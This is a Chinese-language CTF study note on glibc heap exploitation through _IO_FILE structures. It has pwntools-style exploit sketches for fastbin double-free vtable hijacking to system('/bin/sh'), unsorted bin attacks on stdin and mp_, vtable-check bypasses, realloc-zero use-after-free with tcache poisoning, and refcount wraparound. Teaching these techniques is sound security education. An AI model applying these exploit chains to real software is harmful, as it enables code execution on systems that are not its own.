---

phase: binary
vuln_class: [pwn, heap, io-file, uaf]
title: FILE 结构体与堆利用
summary: GOT 被 Full RELRO 锁死后，改 libc 的 _IO_FILE 结构。判据是「有没有 FILE 结构可落点、glibc 版本决定 vtable 校验强度」。
---

# FILE 结构体与堆利用

经典堆手法（House of *、unlink、tcache、musl heap）见 [[binary/漏洞利用/heap-techniques.md|堆利用]]；UAF 与同尺寸复用见 [[binary/漏洞利用/advanced.md|Pwn 进阶]]；堆布局与自定义分配器见 [[binary/漏洞利用/heap-techniques.md|堆利用]]。

## 0. 判据速查

| 前提条件 | 手法 | 去哪节 |
|---|---|---|
| PIE + Full RELRO（GOT 改不了） | fastbin 打 stdout vtable，两段式劫持 | §1 |
| 有 off-by-one NULL 溢出 | 改 `_IO_buf_base` 最低字节，把输入缓冲搬进 FILE 结构 | §2 |
| glibc ≥ 2.24（vtable 有范围校验） | 两跳间接调用绕过 `__IO_vtable_check` | §3 |
| 有 unsorted bin 写机会 | 打 `stdin._IO_buf_end`，让 `scanf` 读到 libc 数据段 | §4 |
| 需要更大可写空间 | 打 `mp_` 结构（`trim_threshold` 天然像 chunk size） | §5 |
| 程序用 `realloc(ptr, size)` 且 size 可控 | size=0 等价 free，绕过正常删除路径 | §6 |
| 结构体里有 `uint8_t` 引用计数 | 计数回绕，256 次 addref 后归零 | §7 |

**总原则**：GOT 被锁 → 改 libc 的可写数据段。`_IO_FILE` 结构、`__malloc_hook`、`__free_hook`、`mp_` 都在那里。

## 1. fastbin 打 stdout vtable（PIE + Full RELRO）

**为什么可行**：libc 的 stdout 区域天然含 `0x7f` 字节，正好能当 `0x70` fastbin 的 size 字段，通过 fastbin 的大小校验。

```python
from pwn import *

# 阶段 1：double-free 把 fastbin 指向 stdout 里的假 chunk
fake_chunk = libc.sym['_IO_2_1_stdout_'] + 0x91   # 这里有 0x7f 字节

a = malloc(0x60)
b = malloc(0x60)
free(a); free(b); free(a)          # 0x70 fastbin: a -> b -> a

malloc(0x60, p64(fake_chunk))      # a->fd 指向假 chunk
malloc(0x60)                       # 返回 b
malloc(0x60)                       # 返回 a

# 阶段 2a：第一次改 vtable → gets()
# rdi 就是 stdout 的 FILE*，所以 gets(stdout) 会把输入读进 stdout 结构
fake = malloc(0x60)                # 返回与 stdout 重叠的假 chunk
write_to(fake, p64(gets_addr))

# 阶段 2b：gets() 再改一次 vtable → system()
# 输入 "1\x80;/bin/sh;"，新 vtable 指向 system()
# gets() 返回后，下一次输出调用触发 system()
```

**两段式的原因**：第一次只能改到 `gets`，因为 `rdi` 已经是 stdout 指针，`gets(stdout)` 天然把输入写进结构体。第二次才有机会把 vtable 改成任意地址，同时把 `/bin/sh` 一起写进去。

**识别**：PIE + Full RELRO + 堆上有 UAF/double-free。`_IO_2_1_stdout_` 附近对齐偏移处的 `0x7f` 是通用落点。

## 2. `_IO_buf_base` 空字节覆写

**形态**：off-by-one 的 NULL 溢出改掉 `stdin` 的 `_IO_buf_base` 最低字节。

```c
// 改前：_IO_buf_base = 0x7f...XX00  → 指向堆上的输入缓冲
// 改后：_IO_buf_base = 0x7f...0000  → 落进 FILE 结构本身，靠近 _short_buf
// 下一次 scanf / fgets 把输入写进 FILE 结构字段
// 于是可以改 _IO_buf_base / _IO_buf_end 为任意地址
// 再下一次读：stdin 从任意地址读 → 任意写原语
```

```python
# 1. 堆布局：让某个 chunk 紧邻 stdin 的 _IO_buf_base（需要 heap grooming）
# 2. 空字节溢出：越过 chunk 边界写一个 0x00，改掉 _IO_buf_base 的 LSB
# 3. 下一次 scanf/fgets：输入被写进 FILE 结构
#    → 把 _IO_buf_base 改成目标地址，_IO_buf_end 改成 目标+size
# 4. 下一次读：stdin 从目标地址读 → 任意写
#    → 改 __free_hook 为 system 或 one_gadget
# 5. 触发：调一个会用可控指针调 free() 的函数
```

**`_short_buf` 是天然落点**：`_IO_buf_base` 的最低字节被清零后，指针正好落进 FILE 结构内部靠近 `_short_buf` 的位置。

## 3. glibc 2.24+ vtable 校验绕过

**问题**：glibc 2.24+ 会把 vtable 指针与 `_IO_vtables` 段比对，段外直接拒绝。

**绕过思路**：校验的是 vtable 地址范围，但**不校验间接调用链**。用两跳解引用跳到未校验的子函数。

```c
// _IO_flush_all_lockp 的调用：
//   fp->vtable->_IO_overflow(fp)
// 用一个合法 vtable 地址 + 偏移技巧：
//   vtable[offset] → 指向 vtable 段外的子函数
//   子函数再解引用一次 → 调到 system()

// 堆布局（用 unsorted bin 的 fd/bk，天然相隔 0x10）：
//   [heap + 0x00] = valid_vtable_addr - 0x18   （过 0xd8 偏移处的校验）
//   [heap + 0x10] = system()                   （经 *(addr + 0xe8) 调用）
```

```python
# unsorted bin attack 把 main_arena+88 写到目标，泄漏 heap/libc
# 构造 FILE 结构，_flags 设为 " sh\x00" 作为 system 的参数
# 触发 exit() → _IO_flush_all_lockp → 两跳调用 → system("sh")
```

**关键**：unsorted bin 里 chunk 的 `fd`/`bk` 恰好相隔 0x10，正好填满两跳需要的两个相邻指针槽。

## 4. unsorted bin 打 `stdin._IO_buf_end`

**形态**：off-by-one NULL 造重叠块 → 释放进 unsorted bin → 用 unsorted bin attack 改 `stdin._IO_buf_end` 为一个大 libc 地址 → 下一次 `scanf` 把数据读进 libc 数据段。

```python
# 1. off-by-one NULL：改下一个块的 PREV_INUSE，设 prev_size
#    → 堆合并造出重叠块
# 2. 释放 victim 进 unsorted bin
#    → victim->fd = main_arena+88, victim->bk = main_arena+96
# 3. unsorted bin attack：设 victim->bk = &stdin._IO_buf_end - 0x10
#    malloc 把 victim 从 unsorted bin 摘除时：
#    → victim->bk->fd = victim   （往 _IO_buf_end 写值）
# 4. _IO_buf_end 变成很大的值 → 下一次 scanf 读入巨量数据
#    → 数据落进 libc 的 stdin 缓冲区域
#    → 该区域的 __malloc_hook 被 one_gadget 覆盖
# 5. 触发：任意 malloc() → __malloc_hook → one_gadget
```

**为什么有效**：`__malloc_hook` 就在 stdin 缓冲区附近，一次大读能顺带覆盖。

## 5. `mp_` 结构当假 chunk

**形态**：`mp_`（`malloc_par`）是 glibc 的全局结构，位于 unsorted bin 附近。它的 `trim_threshold` 字段是个大数值，**天然通过 unsorted bin 的 size 校验**。

```c
// glibc 2.23 的 mp_ 布局（在 libc BSS，靠近 unsorted bin）：
//   offset 0x00: trim_threshold   大值，被当成 chunk size 时通过校验
//   offset 0x08: top_pad
//   offset 0x48: system_mem       必须 > 假 chunk 的 size
```

```python
# 堆溢出改 unsorted bin chunk 的 bk 指向 mp_ 内部
corrupted_bk = mp_addr + FAKE_CHUNK_OFFSET

# 触发 unsorted bin 遍历
# → 在 mp_ 处摘下假 chunk
# → 返回指向 mp_ 内部的指针
malloc(size)                 # 返回 mp_+0x10
write_to_result(one_gadget)  # 覆盖 __malloc_hook
```

**代价**：需要部分 ASLR 爆破（堆地址对齐，约 1/16 命中率）。

## 6. `realloc(ptr, 0)` 当 free 用

```c
// C 标准说 realloc(ptr, 0) 是实现定义的
// glibc 里：realloc(ptr, 0) 等价 free(ptr) 并返回 NULL
void *ptr = malloc(0x80);
ptr = realloc(ptr, 0);      // ptr 变 NULL，块已释放
// 但如果应用另存了旧指针：
void *saved = ptr;
ptr = realloc(ptr, 0);      // 释放了，saved 仍指向已释放块 → UAF
```

```python
add(0, 0x80, b"AAAA")
edit(0, size=0)              # 内部 realloc(ptr,0) = free(ptr)，但索引 0 的指针还在
add(1, 0x80, b"BBBB")        # 复用同一块
view(0)                      # UAF 读，看到 "BBBB"
```

**tcache 变体（glibc 2.26+）**：

```python
add(0, 0x80, b"AAAA")
edit(0, size=0)              # free → tcache[0x90]
add(1, 0x80, p64(target))    # 复用，写入假 fd
edit(0, size=0)              # 再次 free → tcache poisoning
add(2, 0x80, b"CCCC")        # 返回刚释放的块
add(3, 0x80, payload)        # 返回 target → 任意写
```

**识别**：程序用 `realloc` 做 resize 且 size 用户可控。重点看 **size=0 有没有被特殊处理**，以及 **`realloc` 的返回值有没有更新到存储指针** —— 没更新就是悬垂指针。

## 7. 单字节引用计数回绕

```c
struct Book {
    uint8_t refcount;      // 1 字节 —— 漏洞所在
    char title[32];
    void (*read)(struct Book*);
};
```

```text
1. create(h0)                 refcount = 1
2. dup(h0) → h1 ... h256      refcount 从 1 递增，第 256 次回绕到 0
3. release(h1)                refcount 减到 255（下溢）→ 对象被释放
4. 堆重新分配填满同一块
5. read(h0)                   调用攻击者控制的函数指针
```

**判据**：任何守护生命周期的计数器，宽度必须大于程序一次会话内能创建的句柄数。`uint8_t` 引用计数一律可疑 —— 检查 `addref` 是饱和（停在 255）还是回绕。

**只需要 256 次 addref 加一次 release**，即使接口有速率限制也够用。

## 8. 纪律

- **GOT 被锁就改 libc 数据段**。`_IO_FILE`、`__malloc_hook`、`__free_hook`、`mp_` 全在可写区。
- **`0x7f` 字节是 fastbin 的万能钥匙**。libc 里大量指针的高位字节就是 `0x7f`，对齐位置可当 chunk size。
- **glibc 2.24+ 只校验 vtable 地址范围，不校验间接调用**。两跳能跳出去。
- **unsorted bin 的 fd/bk 相隔 0x10**，是天然的两个相邻指针槽。
- **`_IO_buf_base` 最低字节清零后落进 FILE 结构内部**，`_short_buf` 是最近的落点。
- **`realloc(ptr, 0)` 在 glibc 里就是 free**。检查返回值有没有被用上。
- **`uint8_t` 引用计数必查**。宽度不够就是回绕型 UAF，代价只有 256 次调用。
- **版本决定手法**。2.23 / 2.24-2.27 / 2.26+ tcache / 2.31+ 移除 hooks，每个分界的可用原语完全不同 —— 先 `libc.so.6` 确认版本再选手法。
